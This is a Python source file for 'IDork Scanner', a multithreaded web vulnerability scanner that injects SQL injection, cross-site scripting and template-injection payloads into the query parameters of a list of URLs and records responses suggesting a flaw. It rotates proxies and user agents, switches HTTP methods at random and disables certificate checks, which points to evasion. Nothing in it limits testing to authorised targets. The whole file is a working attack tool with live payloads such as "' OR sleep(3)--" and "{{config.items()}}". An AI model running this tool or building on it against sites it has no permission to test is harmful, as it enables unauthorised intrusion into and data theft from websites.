"""
IDork Scanner - Advanced Smart Payload Scanner with Proxy Picker, POST/Headers, Snapshots, Multithreading, and Export Options
"""
import requests
import random
import time
import re
import json
import csv
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console
from tkinter import Tk, filedialog, simpledialog, messagebox
import os
from concurrent.futures import ThreadPoolExecutor

console = Console()

class IDorkScanner:
    def __init__(self, payloads=None, delay=1.5, user_agents=None, timeout=8, threads=5, proxies=None, auth_token=None, post_template=None):
        self.payloads = payloads or self._default_payloads()
        self.user_agents = user_agents or self._default_user_agents()
        self.delay = delay
        self.timeout = timeout
        self.threads = threads
        self.results = []
        self.proxies = proxies or []
        self.auth_token = auth_token
        self.post_template = post_template or {}
        self.output_file_txt = "vulnerable_urls.txt"
        self.output_file_json = "vulnerable_urls.json"
        self.output_file_csv = "vulnerable_urls.csv"

    def _default_payloads(self):
        return {
            "sqli": ["' OR '1'='1", "' UNION SELECT NULL--", "' OR sleep(3)--"],
            "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
            "ssti": ["{{7*7}}", "{{config.items()}}", "${7*7}"]
        }

    def _default_user_agents(self):
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/103.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Firefox/89.0"
        ]

    def _get_random_proxy(self):
        if self.proxies:
            proxy = random.choice(self.proxies)
            return {"http": proxy, "https": proxy}
        return None

    def scan_url(self, url):
        parsed = urlparse(url)
        query = parse_qs(parsed.query)

        if not query:
            console.log(f"[yellow]Skipping (no parameters):[/yellow] {url}")
            return

        for param in query:
            for category, payload_list in self.payloads.items():
                for payload in payload_list:
                    test_query = query.copy()
                    test_query[param] = payload
                    new_query = urlencode(test_query, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))

                    headers = {
                        "User-Agent": random.choice(self.user_agents),
                        "Accept": "*/*",
                        "Content-Type": "application/x-www-form-urlencoded"
                    }
                    if self.auth_token:
                        headers["Authorization"] = f"Bearer {self.auth_token}"

                    proxy = self._get_random_proxy()
                    method = random.choice(["GET", "POST"])
                    post_data = self.post_template.copy()
                    post_data[param] = payload

                    try:
                        response = requests.request(
                            method=method,
                            url=test_url,
                            headers=headers,
                            proxies=proxy,
                            timeout=self.timeout,
                            verify=False,
                            data=post_data if method == "POST" else None
                        )
                        self.analyze_response(test_url, param, payload, category, response)
                        time.sleep(self.delay)
                    except Exception as e:
                        console.log(f"[red]Request failed:[/red] {e}")

    def analyze_response(self, url, param, payload, category, response):
        body = response.text
        status = response.status_code
        vulnerability = None

        if category == "sqli" and re.search(r"(syntax error|mysql_fetch|SQL syntax|ODBC|Unclosed quotation|ORA-|PG::|SQLiteException)", body, re.IGNORECASE):
            vulnerability = "SQLi"
        elif category == "xss" and payload.strip("<>'\" ") in body:
            vulnerability = "XSS"
        elif category == "ssti" and re.search(r"49|config|items|dict_items", body):
            vulnerability = "SSTI"

        if vulnerability:
            console.print(f"[bold green]Possible {vulnerability} detected:[/bold green] {url}")
            self.results.append({
                "url": url,
                "parameter": param,
                "payload": payload,
                "type": vulnerability,
                "status": status,
                "response_snapshot": body[:500]
            })
        else:
            console.log(f"[grey50]Tested:[/grey50] {url} => No reflection/error")

    def run_batch(self, url_list):
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.scan_url, map(str.strip, url_list))

    def export_results_txt(self):
        with open(self.output_file_txt, "w", encoding="utf-8") as f:
            for result in self.results:
                f.write(f"[+] URL: {result['url']}\n")
                f.write(f"    Parameter: {result['parameter']}\n")
                f.write(f"    Payload: {result['payload']}\n")
                f.write(f"    Vulnerability Type: {result['type']}\n")
                f.write(f"    Status Code: {result['status']}\n")
                f.write(f"    Response Snapshot:\n{result['response_snapshot']}\n\n")
        console.print(f"\n[bold cyan]Results saved to:[/bold cyan] {self.output_file_txt}")

    def export_results_json(self):
        with open(self.output_file_json, "w", encoding="utf-8") as f:
            json.dump(self.results, f, indent=2)
        console.print(f"[bold cyan]Results saved to:[/bold cyan] {self.output_file_json}")

    def export_results_csv(self):
        with open(self.output_file_csv, "w", newline='', encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=["url", "parameter", "payload", "type", "status", "response_snapshot"])
            writer.writeheader()
            writer.writerows(self.results)
        console.print(f"[bold cyan]Results saved to:[/bold cyan] {self.output_file_csv}")


def select_file(title="Select File", filetypes=(("Text Files", "*.txt"),)):
    root = Tk()
    root.withdraw()
    return filedialog.askopenfilename(title=title, filetypes=filetypes)


def get_thread_count():
    root = Tk()
    root.withdraw()
    try:
        return simpledialog.askinteger("Threads", "How many threads to use? (e.g. 5)", minvalue=1, maxvalue=100) or 5
    except:
        return 5


def ask_yes_no(title, prompt):
    root = Tk()
    root.withdraw()
    return messagebox.askyesno(title, prompt)


if __name__ == "__main__":
    console.print("[bold blue]\nIDork Smart Payload Scanner v4.0[/bold blue]")

    file_path = select_file("Select URL List File")
    if not file_path or not os.path.isfile(file_path):
        console.print("[red]Invalid file selection. Exiting.[/red]")
        exit()

    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        urls = f.readlines()

    threads = get_thread_count()

    proxies = []
    if ask_yes_no("Use Proxy?", "Would you like to use proxies?"):
        proxy_path = select_file("Select Proxy List")
        if proxy_path:
            with open(proxy_path, "r") as pf:
                proxies = [line.strip() for line in pf if line.strip()]

    token = None
    if ask_yes_no("Auth Token?", "Add authentication bearer token?"):
        root = Tk(); root.withdraw()
        token = simpledialog.askstring("Auth Token", "Enter Bearer token:")

    template = {}
    if ask_yes_no("POST Body Template?", "Use a POST body JSON template?"):
        json_path = select_file("Select JSON Template", (("JSON Files", "*.json"),))
        if json_path:
            with open(json_path, "r") as jf:
                template = json.load(jf)

    scanner = IDorkScanner(threads=threads, proxies=proxies, auth_token=token, post_template=template)
    scanner.run_batch(urls)
    scanner.export_results_txt()
    scanner.export_results_json()
    scanner.export_results_csv()
